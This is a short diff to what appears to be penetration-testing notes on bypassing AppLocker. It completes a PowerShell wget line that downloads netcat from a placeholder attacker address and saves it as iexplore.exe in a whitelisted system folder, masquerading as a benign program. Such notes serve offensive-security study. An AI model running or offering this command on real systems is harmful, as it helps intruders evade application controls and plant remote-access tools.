@@ -138,5 +138,6 @@ THESE ARE SOME DIRECTORIES ARE PERMITTED BY APPLOCKER, THESE ARE ALLOWED
 ALSO HELPS TO BYPASS STATIC STRING ANANLYSIS AND MASQUERADING AS BENIGN APPLICATION 
 
 ```POWERSHELL
-wget http://<attackerip/netcat> -outfile 
+wget http://<attackerip/netcat> -outfile C:\windows\system32\spool\drivers\color\iexplore.exe
 ```
+
